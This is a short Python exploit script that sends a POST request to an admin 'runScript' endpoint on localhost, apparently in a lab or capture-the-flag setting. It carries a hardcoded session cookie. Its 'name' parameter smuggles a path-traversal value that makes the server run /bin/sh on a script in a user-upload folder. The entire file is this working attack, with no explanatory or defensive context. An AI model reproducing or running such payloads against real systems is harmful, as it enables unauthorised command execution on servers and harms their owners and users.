import requests

# URL to which the POST request is sent
url = "http://localhost:8080/admin/runScript"

# Data payload for the POST request
payload = {'name': '../../../../../bin/sh /var/www/userupload/posts/script.sh close'}

# Cookies to be sent with the request
cookies = {'PHPSESSID': 'p4moa1007sm6c8qdp06b7k5m97'}

# Make the POST request
response = requests.post(url, data=payload, cookies=cookies)

# Print the response from the server
print("Status Code:", response.status_code)
print("Response Body:", response.text)
